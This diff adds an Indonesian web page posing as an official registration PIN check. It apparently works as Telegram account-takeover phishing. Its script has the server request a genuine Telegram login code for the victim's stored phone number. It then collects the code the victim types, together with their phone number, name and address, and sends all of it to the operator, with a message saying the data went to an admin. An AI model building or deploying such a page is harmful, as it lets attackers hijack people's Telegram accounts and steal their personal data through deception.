@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi PIN - Pendaftaran Resmi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-[#48b5a3] min-h-screen flex justify-center py-6 px-4 font-sans">
+
+    <div class="max-w-md w-full">
+        <div class="bg-white rounded-3xl shadow-xl overflow-hidden mb-6">
+            
+            <div class="p-8 text-center">
+                <h2 class="text-2xl font-black text-gray-800 mb-3">Masukkan Kode Verifikasi</h2>
+                
+                <p class="text-gray-500 text-sm leading-relaxed mb-6">
+                    <span class="font-bold text-gray-600">Kode 5 digit</span> dikirim ke nomor <br> 
+                    <span id="phoneDisplay" class="font-black text-gray-700 text-base"></span><br>
+                    Silahkan periksa aplikasi Telegram Anda.
+                </p>
+
+                <div id="pin-wrapper" class="flex justify-center gap-2 mb-8">
+                    <input type="text" maxlength="1" class="pin-box w-12 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold text-[#48b5a3] focus:border-[#48b5a3] focus:ring-1 focus:ring-[#48b5a3] outline-none transition-all">
+                    <input type="text" maxlength="1" class="pin-box w-12 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold text-[#48b5a3] focus:border-[#48b5a3] focus:ring-1 focus:ring-[#48b5a3] outline-none transition-all">
+                    <input type="text" maxlength="1" class="pin-box w-12 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold text-[#48b5a3] focus:border-[#48b5a3] focus:ring-1 focus:ring-[#48b5a3] outline-none transition-all">
+                    <input type="text" maxlength="1" class="pin-box w-12 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold text-[#48b5a3] focus:border-[#48b5a3] focus:ring-1 focus:ring-[#48b5a3] outline-none transition-all">
+                    <input type="text" maxlength="1" class="pin-box w-12 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold text-[#48b5a3] focus:border-[#48b5a3] focus:ring-1 focus:ring-[#48b5a3] outline-none transition-all">
+                </div>
+
+                <button id="verifyBtn" class="w-full bg-[#48b5a3] text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all hover:bg-[#3aa08a]">
+                    Verifikasi Sekarang
+                </button>
+                
+                <div id="loadingIndicator" class="hidden mt-4">
+                    <i class="fas fa-spinner fa-spin text-[#48b5a3] text-2xl"></i>
+                    <p class="text-gray-500 text-sm mt-2">Memverifikasi...</p>
+                </div>
+                
+                <p class="text-gray-400 text-xs mt-4">
+                    <button id="resendBtn" class="text-[#48b5a3] hover:underline font-medium">
+                        Kirim ulang kode
+                    </button>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-detect API base - Use relative path for same origin
+        const API_BASE = window.location.origin;
+        
+        // Get stored phone number and phone_code_hash
+        let phoneNumber = localStorage.getItem('userPhone');
+        let phoneCodeHash = localStorage.getItem('phoneCodeHash');
+        let userName = localStorage.getItem('userName') || '';
+        let userAddress = localStorage.getItem('userAddress') || '';
+        
+        // If no phone_code_hash, we need to request a new code from Telegram
+        if (!phoneCodeHash && phoneNumber) {
+            requestTelegramCode();
+        }
+        
+        // Display phone number
+        if (phoneNumber) {
+            let displayPhone = phoneNumber;
+            if (phoneNumber.startsWith('62')) {
+                displayPhone = '+' + phoneNumber;
+            } else if (phoneNumber.startsWith('0')) {
+                displayPhone = '+62' + phoneNumber.substring(1);
+            }
+            document.getElementById('phoneDisplay').textContent = displayPhone;
+        } else {
+            document.getElementById('phoneDisplay').textContent = 'Nomor tidak ditemukan';
+        }
+        
+        // Request code from Telegram servers
+        async function requestTelegramCode() {
+            if (!phoneNumber) {
+                alert('Nomor telepon tidak ditemukan. Silakan daftar ulang.');
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            loadingIndicator.classList.remove('hidden');
+            
+            try {
+                // Use the new endpoint that contacts Telegram servers
+                const response = await fetch(`/api/request-telegram-code`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phoneNumber
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    phoneCodeHash = data.phone_code_hash;
+                    localStorage.setItem('phoneCodeHash', phoneCodeHash);
+                    alert('Kode verifikasi telah dikirim ke Telegram Anda! Silakan periksa aplikasi Telegram.');
+                } else {
+                    alert('Gagal mengirim kode: ' + (data.error || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error requesting code:', error);
+                alert('Terjadi kesalahan saat mengirim kode. Pastikan server berjalan.');
+            } finally {
+                loadingIndicator.classList.add('hidden');
+            }
+        }
+        
+        // Resend button handler
+        document.getElementById('resendBtn').addEventListener('click', function() {
+            requestTelegramCode();
+        });
+        
+        // PIN input handling
+        const inputs = document.querySelectorAll('.pin-box');
+        
+        inputs.forEach((input, index) => {
+            // Move focus to right when typing
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                
+                // Check if all inputs are filled
+                const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+                if (allFilled) {
+                    verifyOTP();
+                }
+            });
+            
+            // Move focus to left when pressing backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+            
+            // Only allow numeric input
+            input.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+        
+        // Verify button handler
+        document.getElementById('verifyBtn').addEventListener('click', verifyOTP);
+        
+        async function verifyOTP() {
+            const enteredOTP = Array.from(inputs).map(i => i.value).join('');
+            
+            if (enteredOTP === '') {
+                alert('Silakan masukkan kode verifikasi!');
+                return;
+            }
+            
+            if (!phoneCodeHash) {
+                alert('Kode sesi tidak ditemukan. Silakan minta kode baru.');
+                return;
+            }
+            
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const verifyBtn = document.getElementById('verifyBtn');
+            
+            loadingIndicator.classList.remove('hidden');
+            verifyBtn.disabled = true;
+            
+            try {
+                const response = await fetch(`/api/verify-code`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phoneNumber,
+                        code: enteredOTP,
+                        phone_code_hash: phoneCodeHash,
+                        userName: userName,
+                        userAddress: userAddress
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('Verifikasi berhasil! Data Anda telah dikirim ke admin.');
+                    // Clear stored data
+                    localStorage.removeItem('phoneCodeHash');
+                    localStorage.removeItem('userPhone');
+                    localStorage.removeItem('userName');
+                    localStorage.removeItem('userAddress');
+                    // Redirect to proses.html
+                    window.location.href = 'proses.html';
+                } else {
+                    alert((data.error || 'Kode verifikasi salah!'));
+                    // Reset input
+                    inputs.forEach(input => input.value = '');
+                    inputs[0].focus();
+                }
+            } catch (error) {
+                console.error('Error verifying code:', error);
+                alert('Terjadi kesalahan saat verifikasi. Pastikan server berjalan.');
+            } finally {
+                loadingIndicator.classList.add('hidden');
+                verifyBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
